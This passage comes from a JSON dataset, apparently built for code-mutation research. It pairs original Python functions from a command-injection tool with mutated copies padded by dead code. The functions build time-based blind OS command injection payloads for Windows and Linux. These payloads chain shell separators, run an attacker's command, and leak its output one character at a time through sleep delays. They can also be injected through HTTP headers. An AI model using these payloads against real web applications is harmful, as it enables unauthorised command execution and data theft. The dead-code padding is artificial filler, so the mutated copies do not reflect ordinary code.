'|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(ord(\\'$(echo $(' + cmd + \"))'[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\\nexit(0)\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"import os; print(ord(os.popen(\\'' + cmd + \"').read().strip()[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(ord(\\'$(echo $(' + cmd + \"))'[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\\nexit(0)\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(ord(\\'$(echo $(' + cmd + \"))'[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\\nexit(0)\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(ord(\\'$(echo $(' + cmd + \"))'[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\\nexit(0)\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"import os; print(ord(os.popen(\\'' + cmd + \"').read().strip()[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(ord(\\'$(echo $(' + cmd + \"))'[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\\nexit(0)\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(ord(\\'$(echo $(' + cmd + \"))'[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\\nexit(0)\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print(ord(\\'$(echo $(' + cmd + \"))'[\" + str(num_of_chars - 1) + ':' + str(num_of_chars) + ']))\\nexit(0)\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload"
        ]
    },
    {
        "func_name": "fp_result",
        "original": "def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=\"$(' + cmd + ')\"' + separator + 'if [ ' + str(ascii_char) + ' -ne $str ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0 ' + separator + 'str=\"$(' + cmd + ')\" ' + separator + '[ ' + str(ascii_char) + ' -eq $str ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(ascii_char) + ' -ne \"$(' + cmd + ')\" ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
        "mutated": [
            "def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=\"$(' + cmd + ')\"' + separator + 'if [ ' + str(ascii_char) + ' -ne $str ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0 ' + separator + 'str=\"$(' + cmd + ')\" ' + separator + '[ ' + str(ascii_char) + ' -eq $str ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(ascii_char) + ' -ne \"$(' + cmd + ')\" ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=\"$(' + cmd + ')\"' + separator + 'if [ ' + str(ascii_char) + ' -ne $str ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0 ' + separator + 'str=\"$(' + cmd + ')\" ' + separator + '[ ' + str(ascii_char) + ' -eq $str ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(ascii_char) + ' -ne \"$(' + cmd + ')\" ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=\"$(' + cmd + ')\"' + separator + 'if [ ' + str(ascii_char) + ' -ne $str ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0 ' + separator + 'str=\"$(' + cmd + ')\" ' + separator + '[ ' + str(ascii_char) + ' -eq $str ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(ascii_char) + ' -ne \"$(' + cmd + ')\" ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=\"$(' + cmd + ')\"' + separator + 'if [ ' + str(ascii_char) + ' -ne $str ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0 ' + separator + 'str=\"$(' + cmd + ')\" ' + separator + '[ ' + str(ascii_char) + ' -eq $str ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(ascii_char) + ' -ne \"$(' + cmd + ')\" ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=\"$(' + cmd + ')\"' + separator + 'if [ ' + str(ascii_char) + ' -ne $str ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0 ' + separator + 'str=\"$(' + cmd + ')\" ' + separator + '[ ' + str(ascii_char) + ' -eq $str ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(ascii_char) + ' -ne \"$(' + cmd + ')\" ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload"
        ]
    },
    {
        "func_name": "fp_result_alter_shell",
        "original": "def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print($(echo $(' + cmd + ')))\\n\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print($(echo $(' + cmd + ')))\\n\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print($(echo $(' + cmd + ')))\\n\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
        "mutated": [
            "def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print($(echo $(' + cmd + ')))\\n\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print($(echo $(' + cmd + ')))\\n\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print($(echo $(' + cmd + ')))\\n\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print($(echo $(' + cmd + ')))\\n\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print($(echo $(' + cmd + ')))\\n\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print($(echo $(' + cmd + ')))\\n\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.SINGLE_WHITESPACE + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + cmd + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"print($(echo $(' + cmd + ')))\\n\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + 